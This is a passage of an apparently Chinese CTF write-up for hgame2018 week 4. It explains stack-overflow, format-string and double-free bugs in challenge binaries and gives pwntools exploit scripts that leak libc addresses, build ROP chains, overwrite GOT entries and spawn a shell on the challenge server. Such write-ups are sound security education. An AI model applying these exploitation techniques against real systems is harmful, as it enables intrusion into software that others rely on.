class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./message_saver'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./message_saver'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400C64'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10011</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x100</span>))</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'==='</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x18</span>))</span><br><span class="line">p.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x00</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x40084D</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'\0\0\0'</span>+p64(<span class="number">0x00</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">tmp = p.recvuntil(<span class="string">'\n=='</span>)</span><br><span class="line">addr = tmp[<span class="number">-9</span>:<span class="number">-3</span>]</span><br><span class="line">puts_addr = u64(addr.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x18</span>))</span><br><span class="line">p.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\0'</span>+p64(elf.got[<span class="string">'puts'</span>])+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="LEVEL-WEEK-4"><a href="#LEVEL-WEEK-4" class="headerlink" title="LEVEL - WEEK 4"></a>LEVEL - WEEK 4</h1><h2 id="ascii-art-market"><a href="#ascii-art-market" class="headerlink" title="ascii_art_market"></a>ascii_art_market</h2><p>题目是一个简单的ASCII码艺术字生成器，但对题目没有什么影响，关键点在于main函数中存在一个0x10比特的栈溢出，导致可以覆盖rbp和返回地址。但这远不够获得shell。</p><p><img src="/img/hgame2018/4_1_1.png" alt=""></p><p>最初的想法是先把rbp迁移到一个可写的地方，然后慢慢调试返回地址到哪里去，一个直接的想法是继续输入，争取更大的rop链，因此先把返回地址写到0x4009fc，这个位置可以继续输入，调试时发现，这样覆盖会把输入内容写到bss-0x80的位置去。这样再把栈迁移到bss-0x80就可以执行输入的rop了，第二次再覆盖时，利用leave ret将栈迁移到bss段上，就可以执行任意的rop了，使用的rop和hacker_system中的相同。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x0400A2B'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10012</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">target = <span class="number">0x4009FC</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0x602c00</span>)+p64(target))</span><br><span class="line">rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000400a91</span></span><br><span class="line">rbp_ret = <span class="number">0x0000000000400640</span></span><br><span class="line">rop =p64(<span class="number">0xbadbad</span>)+ p64(rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>])+ p64(rsi_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) + p64(rbp_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x400A2B</span>)</span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)+p64(<span class="number">0x602c00</span><span class="number">-0x80</span>)+p64(<span class="number">0x400A2B</span>)</span><br><span class="line"><span class="comment">#p.send(p64())</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(rdi_ret) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a90 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a92 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400640 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004009dd : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a93 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a91 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400541 : ret</span></span><br><span class="line"><span class="string">0x0000000000400980 : ret 0x458b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h2><p>题目是一个base64解码器，将用户输入的字符串经过base64解码，然后打印出来。</p><p><img src="/img/hgame2018/4_2_1.png" alt=""></p><p>存在一个明显的格式化字符串漏洞，并且字符串漏洞在栈上，可以对内存地址任意写。</p><p>起初以为很简单，直接使用了之前给的libc文件，却发现怎么搞也搞不通，猜测是libc被替换了，学习使用了libc database，找到了题目使用的libc——libc6-i386_2.19-0ubuntu6.14_amd64.so。</p><p>可以参考置顶日志的libc database使用方法</p><p>最终利用system替换strcmp执行system(‘/bin/sh’)，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">%7$p  offset</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./base64_decoder'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./base64_decoder'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x8048945'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10013</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc6-i386_2.19-0ubuntu6.14_amd64.so'</span>)</span><br><span class="line"><span class="comment">#base64.b64encode(s, altchars=None) </span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(base64.b64encode(<span class="string">'%2$p'</span>))</span><br><span class="line">heap_addr = p.recvline()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap addr:'</span>,heap_addr</span><br><span class="line">heap_addr_int = int(heap_addr[<span class="number">3</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap addr:'</span>,hex(heap_addr_int)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(heap_addr_int<span class="number">-0x110</span>)+<span class="string">"%%%dc%%%d$hhn"</span>%(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(elf.got[<span class="string">'printf'</span>])+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] printf addr:'</span>,hex(printf_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(elf.got[<span class="string">'puts'</span>])+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] puts addr:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system addr:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">target = libc.symbols[<span class="string">'system'</span>] <span class="comment">#</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] strcmp@got: '</span>,hex(elf.got[<span class="string">'strcmp'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">'strcmp'</span>]: target&#125;, write_size=<span class="string">'byte'</span>)</span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h2><p>函数维护了一个bss段上的结构体数组，其每一个结构体的大小是0x38，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x00 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">   | length     |     name 1     | </span><br><span class="line">0x10 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | name 2     |     name 3     | </span><br><span class="line">0x20 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | name 4     |       age      | </span><br><span class="line">0x30 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | intr addr  |                </span><br><span class="line">0x38 +-+-+-+-+-+-+-</span><br></pre></td></tr></table></figure><p>其漏洞在于删除函数中，利用name寻址，将intr address释放后，再释放该结构体，最终将数组的该位置置空。</p><p><img src="/img/hgame2018/4_3_1.png" alt=""></p><p>但问题在于，当出现name相同的结构体时，仅置空了最后一个数组的指针，造成之前的指针均为悬垂指针，进而造成double free漏洞。</p><p>该double free漏洞可以控制任意大小的fastbin，原因是，在add 功能时，可以add任意大小的内存块。</p><p>这里采用了bluecake@dubhe大佬的fastbin利用方法。</p><p>劫持两个fastbin的链来构造新的fake bin块。最终覆写top地址，将top地址覆写为不存在canary保护的函数栈上，再申请堆块是，会把栈地址分配给用户，进一步可以写rop，劫持控制流，拿到shell。</p><p>解题的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import time,base64</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver3'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./hacker_system_ver3'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10014</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,length,intro)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">'age:'</span>)</span><br><span class="line">p.sendline(str(age))</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">p.sendline(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_user</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_user</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step 1 leak libc</span></span><br><span class="line">add(<span class="string">'step1\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step1\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step1'</span>)</span><br><span class="line">add(<span class="string">'nop1\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0x18</span>)+<span class="string">'1'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">3</span>)+p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">print_user(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="comment">#step 2 leak steak</span></span><br><span class="line">add(<span class="string">'step2\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step2\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step2'</span>)</span><br><span class="line">add(<span class="string">'nop2\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0x18</span>)+<span class="string">'2'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">3</span>)+p64(libc.symbols[<span class="string">'environ'</span>]))</span><br><span class="line">print_user(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line">stack_offset =<span class="number">0x7ffd3af20438</span><span class="number">-0x7ffd3af20330</span></span><br><span class="line"><span class="comment">#add('padding\n',18,0x138,'hack by p4nda')</span></span><br><span class="line"><span class="comment">#delete_user('nop2')</span></span><br><span class="line"><span class="comment">#delete_user('2')</span></span><br><span class="line"><span class="comment">#delete_user()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">add('padding_3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">add('step3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">add('step3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">delete_user('step3')</span></span><br><span class="line"><span class="string">add('nop3\n',18,0x38,p64(0x18)+'3'.ljust(0x20,'\0')+p64(3)+p64(0))</span></span><br><span class="line"><span class="string">delete_user('nop3')</span></span><br><span class="line"><span class="string">delete_user('3')</span></span><br><span class="line"><span class="string">delete_user('padding_3')</span></span><br><span class="line"><span class="string">add('ctrl3\n',18,0x38,p64(0xdeadbeef))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step3'</span>)</span><br><span class="line">delete_user(<span class="string">'step3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400a0f')</span></span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">18</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step4'</span>)</span><br><span class="line">delete_user(<span class="string">'step4'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400a0f')</span></span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,p64(libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x10</span>+<span class="number">0x08</span>*<span class="number">6</span>))</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'padding'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stack_addr-stack_offset<span class="number">-0x8</span>))</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x40</span>,p64(<span class="number">0x0000000000401053</span>)+p64(next(libc.search(<span 